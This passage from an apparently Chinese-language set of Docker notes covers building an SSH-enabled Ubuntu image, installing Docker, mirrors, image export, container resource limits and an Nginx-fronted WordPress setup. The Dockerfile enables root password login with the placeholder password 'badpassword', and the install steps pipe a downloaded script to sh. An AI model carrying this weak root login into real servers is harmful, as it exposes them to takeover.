iputils-ping netcat python3-pip python-pip nano vim tzdata screen psmisc\nRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime # \u4fee\u6539\u65f6\u533a\nRUN mkdir -p ~/.pip &amp;&amp; echo '[global]\\nindex-url = http://pypi.doubanio.com/simple/\\n[install]\\ntrusted-host=pypi.doubanio.com\\n'&gt;  ~/.pip/pip.conf\nRUN sed -i 's/prohibit-password/yes/g' /etc/ssh/sshd_config &amp;&amp; sed -i 's/#PermitRootLogin/PermitRootLogin/g' /etc/ssh/sshd_config # \u5141\u8bb8root\u7528\u6237\u5bc6\u7801\u767b\u5f55\nRUN echo root:badpassword|chpasswd # \u8bb0\u5f97\u4fee\u6539\u8fd9\u91cc\u7684\u5bc6\u7801\nADD run.sh /\nRUN chmod +x /run.sh\nCMD /run.sh\n</code></pre> <p>run.sh:</p> <pre><code>#!/bin/bash\nservice ssh start\n# \u5728\u5bb9\u5668\u5185\u5b89\u88c5\u4e86mysql\u7b49\u4e4b\u540e\u53ef\u4ee5\u5728run.sh\u8fd9\u91cc\u6dfb\u52a0\u76f8\u5e94\u7684\u542f\u52a8\u547d\u4ee4\nsleep infinity\n</code></pre> <p>build\u547d\u4ee4\uff1a</p> <pre><code>docker build -t myubuntu18 .\n</code></pre>"},{"location":"Docker/#install","title":"Install \u5b89\u88c5","text":"<p>\u5efa\u8bae\u53c2\u89c1\u5982\u4f55\u7ffb\u5899\uff0c\u90e8\u7f72http proxy</p> <p>\u5b89\u88c5\u4e4b\u524d\uff0c\u5efa\u8bae\u4fee\u6539apt\u6e90</p> <p>\u5b89\u88c5\u4e4b\u524d\uff0c\u6216\u8bb8\u8981\u5bf9\u5185\u6838\u5347\u7ea7\uff0c\u5982\u679c\u6267\u884c\u5b89\u88c5\u811a\u672c\u53d1\u51fa\u4e86\u5bf9aufs\u7684\u8b66\u544a\uff0c\u8bf7\u5148\u770b\u4e0b\u9762\u7684 \u89e3\u51b3aufs\u7684\u95ee\u9898</p> <p>\u5b89\u88c5\u547d\u4ee4\uff1a </p> <pre><code>curl -fsSL get.docker.com -o get-docker.sh\nsh get-docker.sh --mirror Aliyun\n</code></pre> <p>\u5176\u4e2d\u6700\u540e\u4e00\u6b65\u7684apt-get install docker-engine\u8017\u65f6\u8f83\u957f\uff0c\u770b\u8d77\u6765\u5f88\u50cf\u5361\u6b7b\uff0c\u9700\u8981\u8010\u5fc3\u7b49\u5f85</p> <p>\u5b89\u88c5\u540e\u6267\u884cdocker version\uff0c\u6ca1\u6709\u62a5\u9519\u5373\u53ef</p>"},{"location":"Docker/#aufs","title":"\u89e3\u51b3aufs\u7684\u95ee\u9898","text":"<pre><code>apt-get install lxc wget bsdtar curl\napt-get install linux-image-extra-$(uname -r)\nmodprobe aufs\n</code></pre>"},{"location":"Docker/#_2","title":"\u52a0\u901f\u955c\u50cf\u4e0b\u8f7d","text":"<p>\u5728\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u68c0\u67e5docker\u7684\u7248\u672c\uff1a<code>docker -v</code></p> <p>\u5982\u679c\u4f60\u7684docker\u7248\u672c\u4e3a1.6.2,\u8bf7\u53c2\u8003\u4e0b\u65b9 \u5378\u8f7ddocker</p>"},{"location":"Docker/#_3","title":"\u5efa\u8bae\u4f7f\u7528\u963f\u91cc\u4e91\u7684\u955c\u50cf\u6e90","text":"<pre><code>sudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'\n{\n\"registry-mirrors\": [\"https://h0kyslzs.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n</code></pre> <p>\u53e6\u5916\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528USTC\u7684\u955c\u50cf\u6e90\uff1a\u53c2\u8003 https://lug.ustc.edu.cn/wiki/mirrors/help/docker</p>"},{"location":"Docker/#docker_1","title":"Docker\u65e7\u7248\u672c\u5378\u8f7d","text":"<p>\u5982\u679c\u4f60\u7684docker\u662f\u4f7f\u7528apt-get install docker.io\u5b89\u88c5\u7684\uff0c\u5148\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5378\u8f7d\uff1a</p> <pre><code>apt-get remove docker.io\napt-get autoremove\nrm -rf /var/lib/docker\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u5b89\u88c5\u547d\u4ee4\u4e86</p>"},{"location":"Docker/#ip","title":"\u83b7\u5f97\u5bb9\u5668\u7684ip","text":"<p>@TAG getip</p> <pre><code>alias getip=\"docker inspect  --format '{{.NetworkSettings.IPAddress}}' \"\n\ngetip \u5bb9\u5668\u540d\u79f0\n</code></pre> <p>\u8fd9\u79cd\u65b9\u6848\u5bf9macvlan\u7684\u5bb9\u5668\u4e0d\u9002\u7528\uff0c\u53c2\u89c1 \u83b7\u53d6macvlan\u5bb9\u5668\u7684IP</p>"},{"location":"Docker/#_4","title":"\u5bfc\u51fa\u5bfc\u5165","text":""},{"location":"Docker/#-save","title":"\u642c\u8fd0\u955c\u50cf\u2013save\u5bfc\u51fa\u955c\u50cf","text":"<p>\u7531\u4e8e\u7f51\u7edc\u5e26\u5bbd(\u6d41\u91cf)\u5f80\u5f80\u662f\u74f6\u9888\u8d44\u6e90\uff0c\u6240\u4ee5\u4ea7\u751f\u66f4\u5c0f\u7684\u538b\u7f29\u6587\u4ef6\u5f88\u6709\u5fc5\u8981\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u751f\u6210 tar.7z \u6587\u4ef6\uff1a<code>apt-get install -y p7zip-full</code></p> <pre><code>docker save \u955c\u50cf\u540d\u79f0 | 7z a -si \u5bfc\u51fa\u6587\u4ef6\u540d.tar.7z\n</code></pre> <p>\u8fd9\u662f\u751f\u6210tar.gz\u6587\u4ef6\uff1a</p> <pre><code>docker save \u955c\u50cf\u540d\u79f0 | gzip &gt;\u5bfc\u51fa\u6587\u4ef6\u540d.tar.gz\n</code></pre>"},{"location":"Docker/#-load","title":"\u642c\u8fd0\u955c\u50cf\u2013load\u8f7d\u5165\u955c\u50cf","text":"<p>\u5982\u679c\u662f tar.7z \u6587\u4ef6\uff0c\u9700\u8981\u8c03\u7528 7z \u547d\u4ee4\u89e3\u538b\uff1a</p> <pre><code>7z x -so \u6587\u4ef6\u540d.tar.7z | docker load\n</code></pre> <p>\u5982\u679c\u662f tar.gz \u6587\u4ef6\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f7d\u5165\uff1a</p> <pre><code>docker load &lt; \u6587\u4ef6\u540d.tar.gz\n</code></pre>"},{"location":"Docker/#export","title":"Export\u5bfc\u51fa\u5bb9\u5668 \u5e76\u4e0d\u5e38\u7528","text":"<p>\u76f4\u63a5\u5bfc\u51fa\u5bb9\u5668\u5e76\u4e0d\u5e38\u7528\uff0c\u5efa\u8bae<code>docker commit \u5bb9\u5668\u540d\u79f0 \u4fdd\u5b58\u6210\u7684\u955c\u50cf\u540d\u79f0</code>\uff0c\u7136\u540e\u5bfc\u51fa\u955c\u50cf</p> <p>\u5bfc\u51fa\u5bb9\u5668\u5f97\u5230\u7684\u662ftar\u6587\u4ef6\uff0c\u6ca1\u6709\u8fdb\u884c\u538b\u7f29\uff0c\u6211\u4eec\u9700\u8981\u624b\u52a8\u6267\u884c\u538b\u7f29</p> <pre><code>docker export \u5bb9\u5668\u7684\u540d\u79f0\u6216ID | gzip &gt;\u5bfc\u51fa\u6587\u4ef6\u540d.tar.gz\n</code></pre>"},{"location":"Docker/#import","title":"Import\u5bfc\u5165\u5bb9\u5668","text":"<p>\u867d\u7136\u4e0a\u4e00\u6b65\u6211\u4eec\u538b\u7f29\u4e86\uff0c\u4f46docker\u53ef\u4ee5\u76f4\u63a5import\uff0c\u4e0d\u9700\u8981\u7528gunzip</p> <pre><code>docker import \u6587\u4ef6\u540d\n</code></pre>"},{"location":"Docker/#iptables-failed-no-chiantargetmatch-by-that-name","title":"\u89e3\u51b3iptables failed - No chian/target/match by that name","text":"<p>\u5982\u679cdocker\u5b89\u88c5\u7684\u65f6\u5019\u6ca1\u6709\u81ea\u52a8\u628a\u9700\u8981\u7684\u89c4\u5219\u94fe\u52a0\u4e0a\uff0c\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0</p> <pre><code>iptables -t nat -N DOCKER\niptables -t filter -N DOCKER\n</code></pre> <p>\u9644\uff1a\u5982\u679c\u9700\u8981\u5220\u9664\u94fe\u6761\uff0c\u53ef\u4ee5\u7528<code>iptables-save</code>\u5bfc\u51fa\u540e\u624b\u52a8\u7f16\u8f91\u540e<code>iptables-restore</code></p>"},{"location":"Docker/#docker_2","title":"\u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8","text":"<p>\u5f53\u955c\u50cf\u591a\u4e86\u8d77\u6765\u7684\u65f6\u5019\uff0c/var/lib\u6240\u5728\u7684\u78c1\u76d8\u5206\u533a\u5f88\u53ef\u80fd\u88ab\u5360\u6ee1\uff0c\u8fd9\u65f6\u5019\u8981\u8003\u8651\u8fc1\u79fb\u5230\u5176\u4ed6\u786c\u76d8\uff0c\u6b64\u5904\u4ee5\u8fc1\u79fb\u5230<code>/home/docker</code>\u4e3a\u4f8b\u8bf4\u660e</p> <pre><code># \u9996\u5148\u8bb0\u5f97\u5173\u95ed\u670d\u52a1\nservice docker stop\nmv /var/lib/docker /home/\n# \u7136\u540e\u4fee\u6539\u670d\u52a1\u914d\u7f6e\u6587\u4ef6/etc/default/docker\uff0c\u6b64\u5904\u5efa\u8bae\u624b\u52a8vim\u7f16\u8f91\uff0c\u5728\u542f\u52a8\u53c2\u6570\u4e2d\u52a0\u5165\u8fd9\u4e2a\uff1a\n#    --graph='/home/docker'\necho -e \"\\nDOCKER_OPTS=\\\"--graph='/home/docker'\\\"\" &gt;&gt; /etc/default/docker\n</code></pre>"},{"location":"Docker/#debianifconfigkillall","title":"\u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig,killall\u7684\u95ee\u9898","text":"<pre><code>apt-get install net-tools psmisc\n</code></pre>"},{"location":"Docker/#_5","title":"\u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c","text":"<p>@TAG user \u5b89\u5168\u6700\u4f73\u5b9e\u8df5</p> <p>\u5728Dockerfile\u4e2d\u52a0\u5165</p> <pre><code>User nobody\n</code></pre> <p>\u5bb9\u5668\u8fd0\u884c\u540eexec\u8fdb\u53bb\u9ed8\u8ba4\u662fnobody\u7528\u6237\uff0c\u5e76\u4e0d\u80fdsu\u5565\u7684\uff0c\u8fd9\u65f6\u5019exec\u9700\u8981\u5e26\u53c2\u6570-u\u8868\u793a\u7528\u6307\u5b9a\u7528\u6237\u8eab\u4efd\u8fdb\u5165\u5bb9\u5668\uff1a</p> <pre><code>docker exec -i -t -u root \u5bb9\u5668\u540d\u79f0 /bin/bash\n</code></pre>"},{"location":"Docker/#etcresolvconfetchosts","title":"\u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts","text":"<p>\u5728\u5bb9\u5668\u4e2d\u8fd9\u4e24\u4e2a\u6587\u4ef6\u662f\u4ee5mount\u5f62\u5f0f\u6302\u8f7d\u7684\uff0c\u4e0d\u80fdunmount\uff1b\u5373\u4f7f\u8fdb\u884c\u4fee\u6539\uff0c\u5bb9\u5668\u91cd\u542f\u540e\u4fee\u6539\u5c31\u4e22\u5931\u4e86</p> <p>\u5176\u5b9e\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5e94\u8be5\u5728\u5bb9\u5668\u521b\u5efa\u7684\u65f6\u5019\u6307\u5b9a\u53c2\u6570<code>--dns</code>\u548c<code>--add-host</code>\u6765\u52a0\u4ee5\u63a7\u5236\uff1a</p> <pre><code>docker run -d --dns 114.114.114.114 --add-host example.com:1.2.3.4 \u5bb9\u5668\u540d\u79f0\n</code></pre>"},{"location":"Docker/#_6","title":"\u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e","text":"<p>\u5f53\u5bb9\u5668\u662f\u5f00\u653e\u7ed9\u4e0d\u53ef\u4fe1\u57df\u7684\u65f6\u5019(\u5982\u90e8\u7f72\u4e00\u4e2aCTF\u7684pwn\u9898\u76ee)\uff0c\u867d\u7136\u5bb9\u5668\u9003\u90380-day\u6211\u4e5f\u6ca1\u529e\u6cd5\uff0c\u4f46\u9650\u5236\u4e00\u4e0b\u5bb9\u5668\u8d44\u6e90\u5360\u7528\u9632\u6b62\u6405\u5c4e\u4e5f\u662f\u5f88\u6709\u5fc5\u8981\u7684</p> <pre><code>--cpu-shares 512 --cpu-period=100000 --cpu-quota=50000 --memory 104857600 --ulimit=nofile=65536 --pids-limit=200 --blkio-weight=512 --restart=\"always\"\n</code></pre> <p>\u6548\u679c\u7b80\u4ecb\uff1a\u5982\u4e0a\u914d\u7f6e\u6700\u591a\u5360\u7528 50% \u5355\u4e2a CPU \uff0c\u6700\u591a\u5360\u7528100MB\u7269\u7406\u5185\u5b58\uff0c\u5bb9\u5668\u5185\u8fdb\u7a0b\u6570\u76ee\u6700\u591a200\u4e2a</p> <p><code>--cpu-shares</code>\u8868\u793a\u76f8\u5bf9\u5229\u7528\u5360\u6bd4\uff0c\u4e0d\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u503c\u4e3a1024\uff0c\u5355\u4e2aCPU\u662f1024\uff0c\u53ea\u6709\u5f53\u5bb9\u5668\u8bd5\u56fe\u5360\u7528100%\u7684CPU\u65f6\u624d\u4f1a\u4f53\u73b0\u4f5c\u7528\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <p>From: http://blog.opskumu.com/docker-cpu-limit.html \u5047\u5982\u4e00\u4e2a 1core \u7684\u4e3b\u673a\u8fd0\u884c 3 \u4e2a container\uff0c\u5176\u4e2d\u4e00\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 1024\uff0c\u800c\u5176\u5b83 cpu-shares \u88ab\u8bbe\u7f6e\u6210 512\u3002\u5f53 3 \u4e2a\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u7684\u65f6\u5019\u300c\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u5f88\u91cd\u8981\uff0c\u6b64\u65f6\u624d\u53ef\u4ee5\u4f53\u73b0\u8bbe\u7f6e\u503c\u300d\uff0c\u5219\u8bbe\u7f6e 1024 \u7684\u5bb9\u5668\u4f1a\u5360\u7528 50% \u7684 CPU \u65f6\u95f4\uff0c\u5176\u4ed6\u4e24\u4e2a\u5bb9\u5668\u5219\u53ea\u80fd\u5206\u522b\u5360\u7528\u5230 25% \u7684 CPU \u65f6\u95f4\u3002 \u5982\u679c\u4e3b\u673a\u662f 3core\uff0c\u8fd0\u884c 3 \u4e2a\u5bb9\u5668\uff0c\u4e24\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 512\uff0c\u4e00\u4e2a\u8bbe\u7f6e\u4e3a 1024\uff0c\u5219\u6b64\u65f6\u6bcf\u4e2a container \u90fd\u80fd\u5360\u7528\u5176\u4e2d\u4e00\u4e2a CPU \u4e3a 100%\u3002</p> <p><code>--cpu-period</code>\u8868\u793a\u6309\u591a\u5c11\u79d2\u5206\u7247\uff0c\u4f8b\u5982\u8bbe\u7f6e\u4e3a100000\u5c31\u662f\u6309100ms\u5206\u5272\uff0c\u540c\u65f6\u8bbe\u7f6e<code>--cpu-quota</code>\u4e3a50000\u5c31\u662f50ms\uff0c\u6548\u679c\u662f\u540c\u65f6\u53ea\u80fd\u4f7f\u75280.5\u4e2aCPU</p> <p><code>--memory</code>\u9650\u5236\u5bb9\u5668\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\uff0c\u5f53\u5bb9\u5668\u8d85\u51fa\u65f6\uff0c\u5176\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88abkill\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003http://blog.opskumu.com/docker-memory-limit.html</p> <p><code>--blkio-weight</code>\u8868\u793aIO\u76f8\u5bf9\u6743\u91cd\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003http://blog.opskumu.com/docker-io-limit.html</p>"},{"location":"Docker/#ftp","title":"\u5feb\u901f\u90e8\u7f72ftp","text":"<p>@TAG vsftpd</p> <p>vsftpd\u7684\u914d\u7f6e\u771f\u662f\u8ba9\u4eba\u5934\u75bc\uff0c\u4e0d\u5982<code>docker search ftp</code>\u4e00\u756a\uff0c\u7136\u540egoogle\u4e00\u4e0b\u627e\u5230\u5bf9\u5e94\u7684Docker Hub\u9875\u9762</p> <p>\u4f7f\u7528\u6b65\u9aa4\uff1a</p> <pre><code>docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e \"PUBLICHOST=localhost\" -v /path/to/the_ftp_directory:/data stilliard/pure-ftpd:hardened\ndocker exec -it ftpd_server /bin/bash\n#\u8fdb\u5165\u5bb9\u5668\u540e\u521b\u5efa\u7528\u6237\npure-pw useradd bob -f /etc/pure-ftpd/passwd/pureftpd.passwd -m -u ftpuser -d /data\n</code></pre>"},{"location":"Docker/#wordpress","title":"\u5feb\u901f\u90e8\u7f72wordpress","text":"<p>@TAG sub_filter</p> <p>\u60f3\u642d\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684blog\uff0c\u9009\u62e9\u73a9\u4e00\u73a9wordpress\u54af\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u5b8c\u6574\u7684\u6d41\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u53ca\u89e3\u51b3\u65b9\u6848</p> <p>\u6280\u672f\u76f8\u5173\uff1a Docker Nginx HTTPS </p> <p>\u76ee\u6807\uff1a \u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u5168\u7ad9https\u7684wordpress\u7ad9\u70b9\uff0c\u57df\u540d\u4e3aexample.com</p>"},{"location":"Docker/#_7","title":"\u5b8c\u6574\u6d41\u7a0b\uff1a","text":"<ol> <li>\u524d\u671f\u51c6\u5907:\u57df\u540d+vps</li> </ol> <p>\u6ce8\u518c\u57df\u540d \u5982\u679c\u9762\u5411\u56fd\u5185\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u5907\u6848\u54af\uff1b\u522b\u5fd8\u4e86\u914d\u7f6eDNS\u89e3\u6790</p> <p>\u4e70\u4e2avps\u670d\u52a1\u5668\uff0c\u5efa\u8bae\u9009\u62e9\u9999\u6e2fvps</p> <ol> <li>\u5b89\u88c5Docker\u548cNginx</li> </ol> <pre><code>curl -fsSL https://get.docker.com -o get-docker.sh\nsh get-docker.sh --mirror Aliyun\napt-get install -y nginx\n</code></pre> <ol> <li>\u542f\u52a8\u4e00\u4e2amysql\u7684\u955c\u50cf\uff1a</li> </ol> <pre><code># Google\u641c\u7d22\u5173\u952e\u8bcd \"docker mysql\"\ndocker run --name mysql -e MYSQL_ROOT_PASSWORD=\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8bbe\u7f6e\u7684\u5bc6\u7801 -d mysql\n# Google\u641c\u7d22\u5173\u952e\u8bcd \"docker wordpress\"\ndocker run --name wp --link mysql:mysql -p 6666:80 -d wordpress\n</code></pre> <ol> <li> <p>\u57df\u540dhttps\u8bc1\u4e66\u83b7\u53d6\u4ee5\u53ca\u542f\u7528https\u8bbf\u95ee\uff0c\u6b64\u90e8\u5206\u5177\u4f53\u89c1Nginx.md\u4e2d<code>\u83b7\u5f97Let's encrypt\u514d\u8d39https\u8bc1\u4e66</code>\u548c<code>\u914d\u7f6e\u5b89\u5168\u7684https</code>\u90e8\u5206</p> </li> <li> <p>\u914d\u7f6eNginx\uff0c\u5b8c\u6574\u914d\u7f6e\u5982\u4e0b\uff1a</p> </li> </ol> <pre><code>server{\nserver_name *.example.com example.com;\nlocation /.well-known/acme-challenge { #\u8fd9\u662flet's encrypt\u7533\u8bf7\u8bc1\u4e66\u7684\u65f6\u5019\u7528\u5230\u7684\u76ee\u5f55\nalias /tmp/acme/;\ntry_files $uri =404;\n}\nlocation /{\nrewrite ^ https://$host$request_uri? permanent;\n}\n}\nserver{\nserver_name *.example.com example.com;\ninclude https.conf;\naccess_log /var/log/nginx/example_access.log;\nerror_log /var/log/nginx/example_error.log;\nssl_certificate /home/keys/example.crt;\nssl_certificate_key /home/keys/example.key;\nlocation / {\nproxy_pass http://127.0.0.1:6666;\nproxy_set_header Host $host;\nproxy_set_header Accept-Encoding \"\"; #\u7981\u6b62\u540e\u7aef\u8fd4\u56degzip\u5185\u5bb9\uff0c\u4fdd\u8bc1\u80fd\u591f\u66ff\u6362\nsub_filter_once off; #\u591a\u6b21\u66ff\u6362 \u4e0d\u53ea\u662f\u66ff\u6362\u4e00\u6b21\nsub_filter \"http://www.example.com\" \"https://www.example.com\";\n}\n}\n</code></pre>"},{"location":"Docker/#_8","title":"\u9047\u5230\u7684\u5751","text":"<ol> <li>docker run\u7684\u65f6\u5019\u5fd8\u8bb0-p\u53c2\u6570</li> </ol> <p>\u5efa\u8bae\u8fd8\u662f\u628a\u7aef\u53e3\u6620\u5c04\u51fa\u6765\uff0c\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5bb9\u5668\u7684\u5185\u7f51IP\u662f\u4f1a\u53d1\u751f\u53d8\u5316\u7684\uff0c\u4e0d\u9002\u5408\u5c06172.17.0.*\u8fd9\u79cdIP\u5199\u5165nginx\u914d\u7f6e</p> <p>\u6b64\u65f6\u6211\u9009\u62e9\u4e86<code>docker rm -f \u5bb9\u5668ID</code>\u5f3a\u5236\u5220\u6389\u5bb9\u5668\uff0c\u518d\u52a0\u4e0a-p\u53c2\u6570\u540e\u542f\u52a8</p> <ol> <li>\u5168\u7ad9https</li> </ol> <p>\u867d\u7136\u6211\u7684https.conf\u4e2d\u5b9a\u4e49\u4e86HSTS\uff0c\u6d4f\u89c8\u5668\u4e5f\u786e\u5b9e\u4f1a\u628a\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u81ea\u52a8\u7528https\u534f\u8bae\u8bbf\u95ee\uff0c\u4f46\u662f\u8fd8\u662f\u7531\u4e8eform\u7684action\u4e3ahttp\u534f\u8bae\u800c\u8b66\u544a\u4e0d\u5b89\u5168(\u5728Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u7684Console\u770b\u5230)\uff0c\u4e5f\u6ca1\u6709\u5c0f\u7eff\u9501\u663e\u793a\u3002\u6240\u4ee5\u8981\u4fdd\u8bc1\u670d\u52a1\u5668\u8f93\u51fa\u7ed9\u6d4f\u89c8\u5668\u7684\u5185\u5bb9\u5c31\u662fhttps\u7684\u94fe\u63a5</p> <p>\u4e00\u5f00\u59cb\u9009\u62e9\u4e86\u5b98\u65b9wordpress\u7684\u65b9\u6cd5(Google\u5173\u952e\u8bcd\u201dwordpress https\u201d)\uff0c\u7ed3\u679c\u5bfc\u81f4\u4e86\u4e0b\u6587\u7b2c\u4e09\u70b9\u7684\u6298\u817e</p> <p>\u6700\u7ec8\u9009\u62e9\u7684\u65b9\u6848\u662f\u5728nginx\u53cd\u5411\u4ee3\u7406\u7684\u65f6\u5019\u66ff\u6362\u6587\u672c\u5185\u5bb9\uff0c\u4f7f\u7528sub_filter\u8fd9\u4e2a\u6a21\u5757\u8fdb\u884c\u6587\u672c\u5185\u5bb9\u66ff\u6362</p> <p>\u9047\u5230\u4e86\u95ee\u9898\uff0c\u8fd9\u4e2asub_filter\u4e0d\u8d77\u4f5c\u7528\uff0c(Google\u5173\u952e\u8bcd \u201csub_filter not working\u201d)\u539f\u56e0\u662f\u5bb9\u5668\u8fd4\u56de\u7684\u5185\u5bb9\u542f\u7528\u4e86gzip\uff0c\u65e0\u6cd5\u66ff\u6362\uff0c\u65b9\u6cd5\u662f\u52a0\u5165\u4e00\u884c\u914d\u7f6e\u7981\u6b62\u5bb9\u5668\u7684Apache\u4f7f\u7528gzip: proxy_set_header Accept-Encoding \u201c\u201d;</p> <p>\u53c2\u8003\uff1a</p> <p>http://stackoverflow.com/questions/31893211/http-sub-module-sub-filter-of-nginx-and-reverse-proxy-not-working</p> <ol> <li>\u7531\u4e8e\u5728\u540e\u53f0\u4fee\u6539\u4e86Wordpress Address\u548cSite Address\u6539\u4e3ahttps\u7684\u94fe\u63a5\uff0c\u5bfc\u81f4\u540e\u53f0\u65e0\u6cd5\u6253\u5f00\uff0c\u91cd\u5b9a\u5411\u6b7b\u5faa\u73af</li> </ol> <p>\u89e3\u51b3\u65b9\u6848\u662f\u8fdb\u5165mysql\u5bb9\u5668\u624b\u52a8\u4fee\u6539\uff0c\u628a\u8fdb\u884c\u7684\u4fee\u6539\u6539\u56de\u53bb</p> <p>\u95ee\u9898\u5728\u4e8e\u6211\u4e5f\u5e76\u4e0d\u77e5\u9053\u6539\u4e86\u5565\uff0c\u5728\u7ec8\u7aefmysql<code>select * from wp_options;</code>\u6709\u4e9b\u884c\u592a\u957f\u5bfc\u81f4\u5173\u952e\u5185\u5bb9\u5237\u5c4f\u800c\u8fc7\uff0c\u4e0d\u65b9\u4fbf\u67e5\u770b\u8868</p> <p>\u6211\u7684\u65b9\u6cd5\u662f\u5148<code>mysqldump -p\u5bc6\u7801 wordpress &gt;test.sql</code>\uff0c\u518d\u7528nano\u6253\u5f00test.sql\uff0c\u7528Ctrl+W\u641c\u7d22https\uff08Google\u5173\u952e\u8bcd\u201dnano search\u201d\uff09\uff0c\u628a\u5bf9\u5e94\u7684\u5730\u65b9\u627e\u5230\u6539\u56dehttp\uff0c\u4fdd\u5b58\u540e\u7528<code>mysql -p\u5bc6\u7801 wordpress &lt; test.sql</code>\u5bfc\u5165\u6570\u636e\u5e93 \u5b8c\u4e8b~</p>"},{"location":"Docker/#dockerfile-apt-get","title":"Dockerfile \u4e2d\u7684 apt-get","text":"<p>\u4e3a\u4e86\u8ba9 apt-get \u987a\u5229\u9759\u9ed8\u6267\u884c\uff0c\u9700\u8981\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u9632\u6b62\u4ea4\u4e92\uff1a</p> <pre><code>DEBIAN_FRONTEND=noninteractive apt-get install -y ...\n</code></pre>"},{"location":"Docker/#dockerip","title":"\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP","text":"<p>\u8fd9\u91cc\u7684\u5185\u7f51\u4e0d\u662f\u53ea\u6709\u4e3b\u673a\u53ef\u4ee5\u8bbf\u95ee\u7684\u5bb9\u5668Docker\u5185\u7f51\uff0c\u800c\u662f\u4e3b\u673a\u63a5\u5165\u7684\u4f01\u4e1a\u5185\u7f51\u8fd9\u79cd\uff1b\u5982\u679c\u4f60\u80fd\u76f4\u63a5\u901a\u8fc7\u8bbe\u7f6eIP\u83b7\u5f97\u516c\u7f51IP\uff0c\u5f53\u7136\u6309\u7167\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u80fd\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP</p> <p>\u6ce8\u610f\uff1a\u6b64\u65b9\u6cd5Docker\u5bb9\u5668\u867d\u7136\u83b7\u5f97\u4e86\u548c\u4e3b\u673a\u5730\u4f4d\u76f8\u540c\u7684IP\uff0c\u4f46\u5bb9\u5668\u65e0\u6cd5\u4f7f\u7528\u4e3b\u673a\u7684IP\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u4e3b\u673a\u597d\u50cf\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5bb9\u5668\u7684IP\uff0c\u8fd9\u662fLinux\u5185\u6838\u4e3a\u4e86\u9694\u79bb\u6027\u548c\u5b89\u5168\u6027\u505a\u51fa\u7684\u9650\u5236</p> <p>\u53c2\u8003\uff1a </p> <p>\u4e0d\u7528\u7aef\u53e3\u8f6c\u53d1\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP\u5730\u5740 ASSIGN PUBLIC IP ADDRESS TO DOCKER CONTAINER WITHOUT PORT BINDING.</p> <p>Macvlan and IPvlan basics</p> <p>Docker Networking Tip \u2013 Macvlan driver</p> <p>PPT Docker Networking - Common Issues and Troubleshooting Techniques</p> <p>\u505a\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u9996\u5148\u521b\u5efa\u4e00\u4e2aMacvlan\u7c7b\u578b\u7684docker\u7f51\u7edc\uff0c\u7136\u540e\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u52a0\u5165\u8fd9\u4e2a\u7f51\u7edc\u5e76\u6307\u5b9aIP/\u4e0d\u6307\u5b9a\u5219\u81ea\u52a8\u5206\u914d</p> <p>\u4f8b\u5b50\uff1a\u4e3b\u673a\uff08\u7f51\u5361eth0\uff09\u7684IP\u4e3a10.1.1.2\uff0c\u7f51\u5173\u4e3a10.1.1.1\uff0c\u4e3b\u673a\u6240\u5904\u7684IP\u6bb5\u662f10.1.1.1/24\uff0c\u5728\u8be5\u7f51\u6bb5\u5185\u4e3b\u673a\u53ef\u4ee5\u4efb\u610f\u83b7\u5f97IP\uff0c\u6211\u4eec\u5e0c\u671b\u5bb9\u5668\u5206\u914d\u572810.1.1.65~10.1.1.126\u4e4b\u95f4 \uff08\u5373 10.1.1.64/26\uff09</p> <p>\u9644\uff1a \u8fd9\u662f\u4e00\u4e2a\u8f93\u5165Network 10.1.1.64/26\u8f6c\u6362\u4e3aHostMin 10.1.1.65~ HostMax 10.1.1.126\u7684\u8ba1\u7b97\u5668</p> <pre><code>docker network create -d macvlan -o macvlan_mode=bridge -o parent=eth0 --subnet=10.1.1.0/24 --ip-range=10.1.1.64/26 --gateway=10.1.1.1 macvlan_network\n\ndocker run --net=macvlan_network --ip=10.1.1.100 -d 